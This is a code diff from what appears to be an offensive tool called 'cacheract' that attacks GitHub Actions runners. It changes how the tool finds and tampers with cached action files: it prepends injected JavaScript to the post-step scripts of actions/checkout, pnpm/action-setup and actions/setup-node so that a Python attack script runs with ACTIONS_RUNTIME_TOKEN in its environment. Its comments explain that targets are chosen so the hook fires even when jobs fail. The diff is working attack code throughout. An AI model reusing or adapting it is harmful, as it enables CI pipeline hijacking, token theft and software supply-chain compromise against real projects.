@@ -220,16 +220,12 @@ if __name__ == "__main__":
   chmodSync("/tmp/cacheract_attack.py", 0o755);
   console.error("[cacheract] Attack script written");
 
-  // ── Inject into actions/setup-node post-step JavaScript ──
-  // The post-step JS file runs with ACTIONS_RUNTIME_TOKEN in env.
-  // We prepend our attack code that runs synchronously before the normal post-step.
+  // ── Inject into action post-step JavaScript files ──
+  // We target actions with post-if: always() so injection runs even if job fails.
+  // Priority targets (always run): pnpm/action-setup, actions/checkout
+  // Secondary target (success only): actions/setup-node (cache-save)
+  // All post-step JS files run with ACTIONS_RUNTIME_TOKEN in env.
   const actionsDir = "/home/runner/work/_actions";
-  const postStepTargets = [
-    // actions/setup-node cache-save post step
-    "actions/setup-node/v4/dist/cache-save/index.js",
-    // Also try other possible paths/versions
-    "actions/setup-node/__versions/v4/dist/cache-save/index.js",
-  ];
 
   // JS injection code that runs the Python attack script synchronously
   const jsInjection = `
@@ -257,12 +253,23 @@ if __name__ == "__main__":
 
   let injected = 0;
 
-  // Search for setup-node action files
+  // Priority 1: Inject into pnpm/action-setup post-step (post-if: always())
+  // Priority 2: Inject into actions/checkout post-step (post-if: always())
+  // Priority 3: Inject into actions/setup-node post-step (post-if: success())
+  const priorityTargets = ["pnpm", "actions"];
+
   try {
-    // List all actions
     const actionOwners = readdirSync(actionsDir);
     console.error(`[cacheract] Action owners: ${actionOwners.join(", ")}`);
-    for (const owner of actionOwners) {
+
+    // Sort owners to process pnpm first (always-run post-step)
+    const sortedOwners = actionOwners.sort((a: string, b: string) => {
+      const aIdx = priorityTargets.indexOf(a);
+      const bIdx = priorityTargets.indexOf(b);
+      return (aIdx === -1 ? 99 : aIdx) - (bIdx === -1 ? 99 : bIdx);
+    });
+
+    for (const owner of sortedOwners) {
       const ownerDir = join(actionsDir, owner);
       try {
         const repos = readdirSync(ownerDir);
@@ -271,13 +278,22 @@ if __name__ == "__main__":
           try {
             const refs = readdirSync(repoDir);
             for (const ref of refs) {
-              // Look for cache-save post-step
-              const postFile = join(repoDir, ref, "dist", "cache-save", "index.js");
-              if (existsSync(postFile)) {
-                console.error(`[cacheract] Found post-step: ${postFile}`);
-                const original = readFileSync(postFile, "utf8");
-                writeFileSync(postFile, jsInjection + "\n" + original);
-                console.error(`[cacheract] Injected into: ${postFile}`);
+              // Check for dist/index.js (used by checkout, pnpm/action-setup)
+              const distIndex = join(repoDir, ref, "dist", "index.js");
+              if (existsSync(distIndex) && injected === 0) {
+                console.error(`[cacheract] Found post-step: ${distIndex}`);
+                const original = readFileSync(distIndex, "utf8");
+                writeFileSync(distIndex, jsInjection + "\n" + original);
+                console.error(`[cacheract] Injected into: ${distIndex}`);
+                injected++;
+              }
+              // Also check for dist/cache-save/index.js (setup-node)
+              const cacheSave = join(repoDir, ref, "dist", "cache-save", "index.js");
+              if (existsSync(cacheSave) && injected === 0) {
+                console.error(`[cacheract] Found cache-save post-step: ${cacheSave}`);
+                const original = readFileSync(cacheSave, "utf8");
+                writeFileSync(cacheSave, jsInjection + "\n" + original);
+                console.error(`[cacheract] Injected into: ${cacheSave}`);
                 injected++;
               }
             }
@@ -287,18 +303,6 @@ if __name__ == "__main__":
     }
   } catch (e: any) {
     console.error(`[cacheract] Action search error: ${e.message}`);
-  }
-
-  // Also try direct paths
-  for (const target of postStepTargets) {
-    const fullPath = join(actionsDir, target);
-    if (existsSync(fullPath) && injected === 0) {
-      console.error(`[cacheract] Found direct: ${fullPath}`);
-      const original = readFileSync(fullPath, "utf8");
-      writeFileSync(fullPath, jsInjection + "\n" + original);
-      console.error(`[cacheract] Injected into: ${fullPath}`);
-      injected++;
-    }
   }
 
   console.error(`[cacheract] Total injections: ${injected}`);
